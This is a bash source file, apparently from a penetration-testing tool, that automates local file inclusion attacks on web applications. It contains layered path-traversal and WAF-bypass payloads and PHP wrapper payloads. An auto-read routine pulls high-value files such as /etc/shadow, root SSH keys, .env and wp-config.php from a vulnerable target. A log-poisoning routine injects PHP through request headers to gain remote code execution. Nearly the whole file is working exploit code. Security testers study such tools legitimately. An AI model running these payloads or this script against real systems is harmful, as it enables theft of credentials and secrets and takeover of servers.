#!/usr/bin/env bash
# TRAKTR Smart LFI Detection Engine v2.0
# 6-level escalation, multi-signal validation, WAF bypass chains
# Usage: source lfi_engine.sh; detect_lfi <url> <param> <method>

# ── LFI Payload Levels ──────────────────────────────────────────────────────
_lfi_level1() {
  # Basic traversal (always run)
  cat << 'EOF'
../../../../etc/passwd
../../../etc/passwd
../../etc/passwd
../../../../etc/hosts
/etc/passwd
/etc/hosts
../../../../windows/win.ini
..\..\..\..\windows\win.ini
../../../../boot.ini
EOF
}

_lfi_level2() {
  # Encoded/bypass traversal (ordered by success probability)
  cat << 'EOF'
....//....//....//....//etc/passwd
..;/..;/..;/..;/etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
..%5c..%5c..%5c..%5cetc/passwd
..%2f..%2f..%2f..%2fwindows/win.ini
%252e%252e%252fetc/passwd
..%e0%80%af..%e0%80%afetc/passwd
....//....//....//....//windows/win.ini
....\/....\/....\/....\/etc/passwd
EOF
}

_lfi_level3() {
  # Null byte + truncation
  cat << 'EOF'
../../../../etc/passwd%00
../../../../etc/passwd%00.html
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00.php
....//....//....//etc/passwd%00
../../../../etc/passwd%2500
EOF
  # Path truncation (long string)
  printf '../../../../etc/passwd'; printf '.%.0s' {1..256}; echo
}

_lfi_level4_php() {
  # PHP wrappers (only if PHP detected)
  cat << 'EOF'
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=config
php://filter/convert.base64-encode/resource=../config
php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd
expect://id
EOF
  # data:// and phar:// are potentially destructive -- skip in OSCP
  if [[ "${OSCP:-false}" != true ]]; then
    echo "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
    echo "phar://test.phar"
  fi
}

_lfi_level5() {
  # OS-specific deep paths
  cat << 'EOF'
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/version
/proc/self/status
/proc/self/cgroup
/proc/self/mounts
/proc/net/tcp
/proc/sched_debug
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/var/log/vsftpd.log
/etc/shadow
/etc/hostname
/etc/issue
/etc/crontab
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/php/8.2/fpm/php.ini
/etc/php/8.1/fpm/php.ini
/etc/php/7.4/fpm/php.ini
/etc/mysql/my.cnf
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/www-data/.bash_history
/var/www/html/.env
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\inetpub\wwwroot\web.config
..\..\..\..\windows\system.ini
..\..\..\..\windows\repair\SAM
..\..\..\..\windows\win.ini
WEB-INF/web.xml
META-INF/MANIFEST.MF
EOF
}

_lfi_level6_waf_bypass() {
  # WAF bypass encoding chains
  cat << 'EOF'
....\/....\/....\/....\/etc/passwd
..../..../..../..../etc/passwd
..%00/..%00/..%00/..%00/etc/passwd
/%5C../%5C../%5C../%5C../etc/passwd
\..\\..\\..\\..\\etc/passwd
..%u2215..%u2215..%u2215etc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd
..%bg%qf..%bg%qf..%bg%qfetc/passwd
..0x2f..0x2f..0x2f..0x2fetc/passwd
EOF
}

# ── Content signatures ──────────────────────────────────────────────────────
_lfi_check_signatures() {
  local file="$1"
  [[ ! -f "$file" ]] && return 1
  # Unix
  grep -qP 'root:[x*]:0:|daemon:[x*]:' "$file" 2>/dev/null && { echo "unix_passwd"; return 0; }
  # Windows
  grep -qP '\[extensions\]|\[fonts\]' "$file" 2>/dev/null && { echo "win_ini"; return 0; }
  grep -q 'boot loader\|operating systems' "$file" 2>/dev/null && { echo "boot_ini"; return 0; }
  # PHP source (from wrappers)
  grep -qP 'PD9waH|PD9QSFA|PD9waHA' "$file" 2>/dev/null && { echo "php_base64"; return 0; }
  grep -q '<?php\|<?=' "$file" 2>/dev/null && { echo "php_source"; return 0; }
  # Proc filesystem
  grep -qP 'DOCUMENT_ROOT=|HTTP_HOST=|PATH=' "$file" 2>/dev/null && { echo "proc_environ"; return 0; }
  grep -qP '/usr/sbin|/bin/bash|/bin/sh' "$file" 2>/dev/null && { echo "proc_cmdline"; return 0; }
  # Log files
  grep -qP 'GET /|POST /|HTTP/1\.' "$file" 2>/dev/null && { echo "log_file"; return 0; }
  # web.xml / web.config
  grep -q '<web-app\|<configuration\|<servlet' "$file" 2>/dev/null && { echo "config_file"; return 0; }
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  MAIN LFI DETECTION FUNCTION
# ═══════════════════════════════════════════════════════════════════════════
detect_lfi() {
  local url="$1" param="$2" method="${3:-GET}"
  local framework="${FRAMEWORK:-generic}" waf="${WAF_DETECTED:-none}"
  local oscp="${OSCP:-false}" outdir="${OUTDIR:-/tmp}"
  local max_per_level=50 abort_after=5

  # ── STEP 1: BASELINE ──
  local baseline_file; baseline_file=$(mktemp "${outdir}/lfi_baseline_XXXXX")
  local baseline_metrics
  baseline_metrics=$(_lfi_request "$url" "$param" "traktr_safe_canary_value" "$method" "$baseline_file")
  local baseline_status baseline_size baseline_time
  IFS='|' read -r baseline_status baseline_size baseline_time <<< "$baseline_metrics"

  # ── STEP 2: LEVEL-BY-LEVEL TESTING ──
  local confirmed=false best_payload="" best_signals=0 best_signal_list="" best_proof="" best_encoding=""
  local consecutive_misses=0 requests_this_level=0

  _run_level() {
    local level_name="$1" # $2=level_num (unused)
    shift 2
    consecutive_misses=0; requests_this_level=0

    while IFS= read -r payload; do
      [[ -z "$payload" ]] && continue
      ((requests_this_level++)) || true
      [[ $requests_this_level -gt $max_per_level ]] && break

      local resp_file; resp_file=$(mktemp "${outdir}/lfi_resp_XXXXX")
      local metrics
      metrics=$(_lfi_request "$url" "$param" "$payload" "$method" "$resp_file")
      local resp_status resp_size resp_time
      IFS='|' read -r resp_status resp_size resp_time <<< "$metrics"

      # Skip if curl failed entirely (000 = connection error)
      [[ "$resp_status" == "000" ]] && { rm -f "$resp_file"; ((consecutive_misses++)) || true; continue; }

      # Multi-signal check
      local signals=0 signal_list=""

      # Signal A: Content signature match
      local sig_type
      if sig_type=$(_lfi_check_signatures "$resp_file"); then
        ((signals++)) || true
        signal_list+="content_match(${sig_type}),"
      fi

      # Signal B: Size delta
      local delta=$(( ${resp_size:-0} - ${baseline_size:-0} ))
      if [[ ${delta#-} -gt 200 ]]; then
        ((signals++)) || true
        signal_list+="length_delta(${delta}),"
      fi

      # Signal C: Time delta
      if [[ -n "$resp_time" ]] && [[ -n "$baseline_time" ]]; then
        local slow; slow=$(awk "BEGIN{if($baseline_time>0 && $resp_time/$baseline_time>=2.0) print 1; else print 0}" 2>/dev/null) || true
        [[ "$slow" == "1" ]] && { ((signals++)) || true; signal_list+="time_delta,"; }
      fi

      # Signal D: Status change (ignore 000 = curl failure/timeout)
      if [[ "$resp_status" != "$baseline_status" ]] && [[ "$resp_status" != "000" ]]; then
        ((signals++)) || true
        signal_list+="status_change(${baseline_status}->${resp_status}),"
      fi

      # Evaluate
      if [[ $signals -ge 1 ]]; then
        consecutive_misses=0
        if [[ $signals -gt $best_signals ]]; then
          best_signals=$signals
          best_payload="$payload"
          best_encoding="$level_name"
          best_signal_list="${signal_list%,}"
          best_proof=$(grep -oP -m1 'root:[x*]:0:[^\n]{0,60}|\[extensions\][^\n]{0,40}|PD9waH[^\n]{0,40}|DOCUMENT_ROOT=[^\n]{0,40}|<\?php[^\n]{0,40}' "$resp_file" 2>/dev/null | head -1 || echo "size_delta=$delta")
          [[ $signals -ge 2 ]] && { confirmed=true; rm -f "$resp_file"; return 0; }
        fi
      else
        ((consecutive_misses++)) || true
        [[ $consecutive_misses -ge $abort_after ]] && { rm -f "$resp_file"; return 1; }
      fi

      rm -f "$resp_file"
    done

    return 1
  }

  # Run levels in escalating order
  _run_level "basic_traversal" 1 < <(_lfi_level1) && confirmed=true || true
  if ! $confirmed; then
    _run_level "encoded_traversal" 2 < <(_lfi_level2) && confirmed=true || true
  fi
  if ! $confirmed; then
    _run_level "null_byte" 3 < <(_lfi_level3) && confirmed=true || true
  fi
  # Level 4: PHP wrappers only if PHP detected
  if ! $confirmed && [[ "$framework" =~ ^(php|wordpress|laravel|drupal|joomla|symfony)$ ]]; then
    _run_level "php_wrapper" 4 < <(_lfi_level4_php) && confirmed=true || true
  fi
  if ! $confirmed; then
    _run_level "os_deep_paths" 5 < <(_lfi_level5) && confirmed=true || true
  fi
  # Level 6: WAF bypass (only if WAF detected and nothing found yet)
  if ! $confirmed && [[ "$waf" != "none" ]]; then
    _run_level "waf_bypass" 6 < <(_lfi_level6_waf_bypass) && confirmed=true || true
  fi

  rm -f "$baseline_file"

  # ── STEP 3: DEPTH ESCALATION ──
  local found_depth=""
  if $confirmed || [[ $best_signals -ge 1 ]]; then
    # Try to find minimum working depth
    if [[ "$best_payload" == *".."* ]]; then
      for d in 1 2 3 4 5 6 7 8 9 10 12 15; do
        local traversal=""
        for ((i=0; i<d; i++)); do traversal+="../"; done
        local depth_payload="${traversal}etc/passwd"
        local depth_file; depth_file=$(mktemp "${outdir}/lfi_depth_XXXXX")
        _lfi_request "$url" "$param" "$depth_payload" "$method" "$depth_file" > /dev/null
        if _lfi_check_signatures "$depth_file" > /dev/null 2>&1; then
          found_depth=$d
          rm -f "$depth_file"
          break
        fi
        rm -f "$depth_file"
      done
    fi
  fi

  # ── STEP 4: OUTPUT ──
  if [[ $best_signals -ge 1 ]]; then
    local confidence="LOW"
    [[ $best_signals -ge 2 ]] && confidence="HIGH"
    [[ $best_signals -eq 1 ]] && confidence="MEDIUM"
    local prefix=""; [[ "$oscp" == true ]] && prefix="POTENTIAL "
    local curl_cmd; curl_cmd=$(build_curl_command "$url" "$method" "$param" "$best_payload" 2>/dev/null || echo "curl -sk '${url}?${param}=$(encode_payload "$best_payload" url 2>/dev/null || echo "$best_payload")'")
    local next_steps; next_steps=$(suggest_next_step "lfi" "$framework" 2>/dev/null | head -3 | tr '\n' ' ') || true

    # JSON output
    local _esc_payload="${best_payload//\"/\\\"}"
    local _esc_proof="${best_proof//\"/\\\"}"
    local _esc_curl="${curl_cmd//\"/\\\"}"
    _esc_proof="${_esc_proof:0:100}"
    cat << LFIEOF
{"type":"${prefix}lfi","url":"$url","param":"$param","method":"$method","depth":${found_depth:-0},"encoding":"$best_encoding","payload":"${_esc_payload}","signal_count":$best_signals,"signals":"$best_signal_list","confidence":"$confidence","proof":"${_esc_proof}","curl":"${_esc_curl}","next_steps":"$next_steps","framework":"$framework","waf":"$waf"}
LFIEOF

    # Terminal alert
    echo -e "\033[1;33m  [!!] LFI: ${url} (${param}) [$confidence] signals=${best_signals} encoding=${best_encoding}${found_depth:+ depth=$found_depth}\033[0m" >&2

    # ── STEP 5: AUTO-READ INTERESTING FILES ──
    if $confirmed; then
      _lfi_auto_read "$url" "$param" "$best_payload" "$method" "$outdir"
    fi
  fi
}

# ═══════════════════════════════════════════════════════════════════════════
#  AUTO-READ: When LFI is confirmed, read high-value files & display content
# ═══════════════════════════════════════════════════════════════════════════
_lfi_auto_read() {
  local url="$1" param="$2" working_payload="$3" method="$4" outdir="$5"
  local lfi_reads_dir="${outdir}/lfi_reads"
  mkdir -p "$lfi_reads_dir"

  # Extract the bypass pattern from the working payload
  # Build bypass prefix from the working payload pattern
  # IMPORTANT: prefix must end with the traversal separator so target_file
  # (e.g. "etc/passwd") is appended correctly as ".../etc/passwd"
  local bypass_prefix=""
  if [[ "$working_payload" == *"....//..../"* ]]; then
    bypass_prefix="....//....//....//....//....//....//....//....//....//..../"
    # Ensure the join produces ....//etc/passwd not ..../etc/passwd
    bypass_prefix+="/"
  elif [[ "$working_payload" == *"..%2f"* ]]; then
    bypass_prefix="..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
  elif [[ "$working_payload" == *"..%252f"* ]]; then
    bypass_prefix="..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f"
  elif [[ "$working_payload" == *"..%c0%af"* ]]; then
    bypass_prefix="..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af"
  elif [[ "$working_payload" == *"..;/"* ]]; then
    bypass_prefix="..;/..;/..;/..;/..;/..;/..;/..;/"
  else
    # Standard traversal — ends with / so etc/passwd becomes /etc/passwd
    bypass_prefix="../../../../../../../../../../../../"
  fi

  # High-value targets -- comprehensive list for real engagements
  local -a targets_unix=(
    "etc/passwd"
    "etc/shadow"
    "etc/hostname"
    "etc/hosts"
    "etc/os-release"
    "etc/issue"
    "etc/crontab"
    "etc/resolv.conf"
    "etc/environment"
    "etc/ssh/sshd_config"
    "etc/nginx/nginx.conf"
    "etc/nginx/sites-enabled/default"
    "etc/nginx/conf.d/default.conf"
    "etc/apache2/apache2.conf"
    "etc/apache2/sites-enabled/000-default.conf"
    "etc/apache2/ports.conf"
    "etc/httpd/conf/httpd.conf"
    "etc/php.ini"
    "etc/mysql/my.cnf"
    "etc/my.cnf"
    "proc/self/environ"
    "proc/self/cmdline"
    "proc/self/status"
    "proc/self/cgroup"
    "proc/self/mounts"
    "proc/self/net/tcp"
    "proc/self/fd/0"
    "proc/self/fd/1"
    "proc/self/fd/2"
    "proc/self/fd/5"
    "proc/self/fd/10"
    "proc/version"
    "proc/net/arp"
    "proc/net/fib_trie"
    "var/log/auth.log"
    "var/log/syslog"
    "root/.bash_history"
    "root/.ssh/id_rsa"
    "root/.ssh/authorized_keys"
  )
  local -a targets_php=(
    "var/www/html/index.php"
    "var/www/html/config.php"
    "var/www/html/.env"
    "var/www/html/wp-config.php"
    "var/www/html/.htaccess"
    "var/www/html/configuration.php"
    "var/www/html/settings.php"
    "var/www/html/database.php"
    "var/www/.env"
    "proc/self/cwd/index.php"
    "proc/self/cwd/config.php"
    "proc/self/cwd/.env"
    "proc/self/cwd/.htaccess"
    "proc/self/cwd/wp-config.php"
    "proc/self/cwd/composer.json"
    "proc/self/cwd/.git/config"
  )
  local -a targets_win=(
    "windows/win.ini"
    "windows/system.ini"
    "windows/system32/drivers/etc/hosts"
    "inetpub/wwwroot/web.config"
    "windows/repair/SAM"
    "xampp/apache/conf/httpd.conf"
  )

  # Get baseline response (non-existent file) to filter false reads
  local baseline_file="${lfi_reads_dir}/_baseline.txt"
  _lfi_request "$url" "$param" "${bypass_prefix}traktr_nonexistent_baseline_file.xyz" "$method" "$baseline_file" > /dev/null 2>&1
  local baseline_size=0
  [[ -f "$baseline_file" ]] && baseline_size=$(wc -c < "$baseline_file" 2>/dev/null || echo 0)
  local baseline_md5=""
  [[ -f "$baseline_file" ]] && baseline_md5=$(md5sum "$baseline_file" 2>/dev/null | cut -d' ' -f1)

  echo -e "\033[1;36m  ┌─── LFI Auto-Read Results ───────────────────────────\033[0m" >&2
  local files_read=0

  # Decide which targets to try based on detected framework/OS
  local all_targets=("${targets_unix[@]}")
  local framework="${FRAMEWORK:-generic}"
  [[ "$framework" =~ ^(php|wordpress|laravel|drupal|joomla|symfony)$ ]] && all_targets+=("${targets_php[@]}")
  # If working payload contains backslash or win.ini was found, add Windows targets
  if [[ "$working_payload" == *"\\"* ]] || [[ "$working_payload" == *"win.ini"* ]]; then
    all_targets=("${targets_win[@]}" "${all_targets[@]}")
  fi

  for target_file in "${all_targets[@]}"; do
    local payload="${bypass_prefix}${target_file}"
    local resp_file
    resp_file="${lfi_reads_dir}/$(echo "$target_file" | tr '/' '_').txt"
    _lfi_request "$url" "$param" "$payload" "$method" "$resp_file" > /dev/null 2>&1

    local fsize=0
    [[ -f "$resp_file" ]] && fsize=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
    # Skip empty or tiny responses
    [[ "$fsize" -le 10 ]] && continue

    # Skip if response is identical to baseline (same default page)
    local resp_md5=""
    resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)
    [[ "$resp_md5" == "$baseline_md5" ]] && { rm -f "$resp_file"; continue; }

    # Skip if size matches baseline within 5% tolerance (catch-all page)
    local size_diff=$(( fsize - baseline_size ))
    [[ ${size_diff#-} -lt 20 ]] && [[ "$baseline_size" -gt 100 ]] && { rm -f "$resp_file"; continue; }

    # Verify content has signatures or is genuinely different
    local sig_type=""
    sig_type=$(_lfi_check_signatures "$resp_file" 2>/dev/null) || true

    if [[ -n "$sig_type" ]] || [[ $size_diff -gt 200 ]] || [[ $size_diff -lt -200 ]]; then
      ((files_read++)) || true
      local preview
      preview=$(strings "$resp_file" 2>/dev/null | head -8)
      echo -e "\033[1;32m  │ /$target_file\033[0m \033[2m(${fsize} bytes)\033[0m" >&2
      while IFS= read -r line; do
        echo -e "\033[2m  │   ${line}\033[0m" >&2
      done <<< "$preview"
    else
      rm -f "$resp_file"
    fi
  done
  rm -f "$baseline_file"

  echo -e "\033[1;36m  └─── ${files_read} files read ────────────────────────────\033[0m" >&2

  # ── LOG POISONING / RCE ESCALATION ──
  local oscp="${OSCP:-false}"
  if [[ "$oscp" != true ]]; then
    _lfi_log_poison "$url" "$param" "$bypass_prefix" "$method" "$lfi_reads_dir" "$baseline_size" "$baseline_md5"
  else
    echo -e "\033[2m  [OSCP] Skipping log poisoning (destructive technique)\033[0m" >&2
  fi

  # Save summary
  {
    echo "LFI confirmed: $url ($param)"
    echo "Working payload pattern: $bypass_prefix"
    echo "Files successfully read: $files_read"
    find "$lfi_reads_dir" -name '*.txt' -printf '%p %s bytes\n' 2>/dev/null
  } > "${lfi_reads_dir}/summary.txt"
}

# ═══════════════════════════════════════════════════════════════════════════
#  LOG POISONING: Attempt RCE via LFI + access log injection
# ═══════════════════════════════════════════════════════════════════════════
_lfi_log_poison() {
  local url="$1" param="$2" bypass_prefix="$3" method="$4" outdir="$5"
  local baseline_size="${6:-0}" baseline_md5="${7:-}"

  # Log file paths to try including -- comprehensive for different OS/server combos
  local -a log_paths=(
    "var/log/apache2/access.log"
    "var/log/apache2/error.log"
    "var/log/apache/access.log"
    "var/log/apache/error.log"
    "var/log/httpd/access_log"
    "var/log/httpd/error_log"
    "var/log/nginx/access.log"
    "var/log/nginx/error.log"
    "usr/local/apache2/logs/access_log"
    "usr/local/apache2/logs/error_log"
    "opt/lampp/logs/access_log"
    "opt/lampp/logs/error_log"
    "proc/self/fd/1"
    "proc/self/fd/2"
    "var/log/syslog"
    "var/log/messages"
    "var/log/mail.log"
    "var/log/auth.log"
    "var/log/php_errors.log"
    "var/log/php-fpm.log"
    "tmp/access.log"
    "tmp/error.log"
  )

  echo -e "\033[1;35m  ┌─── Log Poisoning Check ──────────────────────────────\033[0m" >&2

  # Step 1: Check which log files are readable
  local readable_log=""
  for logpath in "${log_paths[@]}"; do
    local payload="${bypass_prefix}${logpath}"
    local resp_file
    resp_file="${outdir}/logcheck_$(echo "$logpath" | tr '/' '_').txt"
    _lfi_request "$url" "$param" "$payload" "$method" "$resp_file" > /dev/null 2>&1

    local fsize=0
    [[ -f "$resp_file" ]] && fsize=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
    local resp_md5
    resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)

    # Check if different from baseline AND contains log-like content
    if [[ "$resp_md5" != "$baseline_md5" ]] && [[ "$fsize" -gt 50 ]]; then
      if grep -qiP 'GET /|POST /|HTTP/1\.|Mozilla|User-Agent' "$resp_file" 2>/dev/null; then
        readable_log="$logpath"
        echo -e "\033[1;32m  │ Readable log: /$logpath\033[0m" >&2
        rm -f "$resp_file"
        break
      fi
    fi
    rm -f "$resp_file"
  done

  if [[ -z "$readable_log" ]]; then
    echo -e "\033[2m  │ No readable log files found\033[0m" >&2
    echo -e "\033[1;35m  └─── Log poisoning: not viable ─────────────────────\033[0m" >&2
    return
  fi

  # Step 2: Inject PHP code via multiple vectors (User-Agent, Referer, direct URL param)
  local poison_marker
  poison_marker="TRAKTR_RCE_$(date +%s)"
  local php_payload="<?php echo '${poison_marker}'; ?>"
  local target_base="${url%%\?*}"
  local rce_confirmed=false
  local rce_vector=""

  # Try injection via User-Agent header
  curl -sk -o /dev/null --max-time 5 \
    -H "User-Agent: ${php_payload}" \
    "${target_base}/" 2>/dev/null || true

  # Also try Referer header injection
  curl -sk -o /dev/null --max-time 5 \
    -H "Referer: ${php_payload}" \
    "${target_base}/" 2>/dev/null || true

  # Also try injecting via a GET parameter (some servers log full URLs)
  curl -sk -o /dev/null --max-time 5 \
    "${target_base}/?traktr_poison=$(python3 -c "import urllib.parse;print(urllib.parse.quote('${php_payload}'))" 2>/dev/null || echo "${php_payload}")" 2>/dev/null || true

  # Step 3: Include the log file and check if our code executed
  sleep 1
  local rce_file="${outdir}/logpoison_rce_check.txt"
  local log_payload="${bypass_prefix}${readable_log}"
  _lfi_request "$url" "$param" "$log_payload" "$method" "$rce_file" > /dev/null 2>&1

  if grep -q "$poison_marker" "$rce_file" 2>/dev/null; then
    rce_confirmed=true
    rce_vector="User-Agent/Referer PHP injection"
  fi

  if $rce_confirmed; then
    echo -e "\033[1;31m  │ ★ RCE CONFIRMED via log poisoning!\033[0m" >&2
    echo -e "\033[1;31m  │   Log: /$readable_log\033[0m" >&2
    echo -e "\033[1;31m  │   Method: ${rce_vector}\033[0m" >&2

    local encoded_log
    encoded_log=$(encode_payload "$log_payload" url 2>/dev/null || echo "$log_payload")
    echo -e "\033[1;33m  │   PoC: curl -sk -H 'User-Agent: <?php system(\"id\"); ?>' '${target_base}/' && curl -sk '${url}?${param}=${encoded_log}'\033[0m" >&2

    # Save RCE finding to vuln output
    local _esc_base="${target_base//\"/\\\"}"
    local _esc_url="${url//\"/\\\"}"
    local _esc_log="${encoded_log//\"/\\\"}"
    echo "{\"type\":\"rce_log_poison\",\"url\":\"${_esc_url}\",\"param\":\"$param\",\"log_file\":\"/$readable_log\",\"confidence\":\"HIGH\",\"proof\":\"${poison_marker} found in response\",\"curl\":\"curl -sk -H 'User-Agent: <?php system(\\\\\\\"id\\\\\\\"); ?>' '${_esc_base}/' && curl -sk '${_esc_url}?${param}=${_esc_log}'\"}" >> "${outdir}/../vuln/lfi.json" 2>/dev/null || true
  else
    echo -e "\033[2m  │ Log readable but code not executed (PHP not processing log)\033[0m" >&2
    # Still useful info: save a PoC command for manual testing
    local encoded_log
    encoded_log=$(encode_payload "$log_payload" url 2>/dev/null || echo "$log_payload")
    echo -e "\033[2m  │ Manual PoC: inject PHP in User-Agent, then include /$readable_log\033[0m" >&2
  fi
  rm -f "$rce_file"

  echo -e "\033[1;35m  └─── Log poisoning check complete ────────────────────\033[0m" >&2
}

# ── HTTP request helper (returns status|size|time) ──────────────────────────
_lfi_request() {
  local url="$1" param="$2" payload="$3" method="${4:-GET}" outfile="$5"
  local encoded; encoded=$(encode_payload "$payload" url 2>/dev/null || echo "$payload")

  local target_url
  if [[ "$method" == "GET" ]]; then
    if [[ "$url" == *"?"* ]]; then
      target_url="${url}&${param}=${encoded}"
    else
      target_url="${url}?${param}=${encoded}"
    fi
  else
    target_url="$url"
  fi

  local metrics
  if [[ "$method" == "GET" ]]; then
    metrics=$(_curl "$target_url" -o "$outfile" -w '%{http_code}|%{size_download}|%{time_total}' 2>/dev/null) || metrics="000|0|0"
  else
    metrics=$(_curl "$target_url" -X POST -d "${param}=${encoded}" -o "$outfile" -w '%{http_code}|%{size_download}|%{time_total}' 2>/dev/null) || metrics="000|0|0"
  fi

  echo "$metrics"
}
